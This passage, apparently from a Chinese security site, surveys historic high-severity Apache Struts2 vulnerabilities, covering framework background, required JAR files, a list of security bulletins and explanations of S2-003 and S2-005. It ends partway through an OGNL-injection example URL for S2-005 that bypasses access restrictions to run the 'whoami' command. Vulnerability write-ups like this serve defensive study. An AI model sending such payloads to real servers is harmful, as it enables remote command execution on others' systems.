# 【技术分享】浅谈Struts2历史上的高危漏洞

**译文声明**
本文为翻译文章，原文来源于安全客。译文仅供参考，具体内容及含义请以原文为准。

**作者**：[Carpediem](http://bobao.360.cn/member/contribute?uid=2659563319)  
**预估稿费**：300 RMB  
**投稿方式**：发送邮件至linwei#360.cn，或登录网页版在线投稿

## 前言
Apache Struts2是世界上最流行的Java Web框架之一，在教育、金融、互联网和通信等重要行业中广泛应用。其高危漏洞可能导致严重的网络安全风险和巨大的经济损失。本文旨在梳理历史上出现的高危漏洞的原因、受影响版本以及相应的利用方式，欢迎读者指正不足之处。

### 基础知识
- **Struts1** 是世界上第一个发布的MVC框架。
- **Struts2** 是在WebWork和Struts1基础上开发的，底层使用了XWork，并整合了一种强大的表达式语言OGNL（Object-Graph Navigation Language）。

基于Struts2框架开发项目时，需要引用一些基础的JAR包。在Struts 2.0.*版本中，必需的JAR包包括：

- `struts2-core-x.x.jar` - Struts2的核心包
- `Freemarker-x.x.jar` - FreeMarker模板引擎
- `commons-logging.jar` - 通用日志记录包
- `ognl-x.x.jar` - 支持OGNL表达式
- `xwork-x.x.jar` - XWork包（由于Struts2是从XWork延伸而来，某些类仍然与XWork相关）

后续版本可能还需要其他JAR包，如`commons-fileupload-1.2.1.jar` 用于支持文件上传。

根据[Apache官方文档](http://struts.apache.org/docs/security-bulletins.html)，历史上涉及的高危漏洞如下：
- S2-003, S2-005, S2-007, S2-008, S2-009, S2-012~S2-016, S2-019, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, DevMode。

## 漏洞详解

### S2-003、S2-005、S2-007

#### S2-003
**受影响版本**：低于Struts 2.0.12  
Struts2会将HTTP参数名解析为OGNL语句执行（类似于Java代码）。通过OGNL表达式可以访问Struts对象，而Struts框架通过过滤`#`字符来防止安全问题。然而，通过Unicode编码（`\u0023`）或八进制（`\43`）即可绕过这一限制。

#### S2-005
**受影响版本**：低于Struts 2.2.1  
对于S2-003漏洞，官方通过增加安全配置（禁止静态方法调用和类方法执行等）来修补，但这些安全配置被绕过，导致了新的漏洞。

示例：
```
http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27whoami%5C%27%27%29%28d%29%29&%28h%2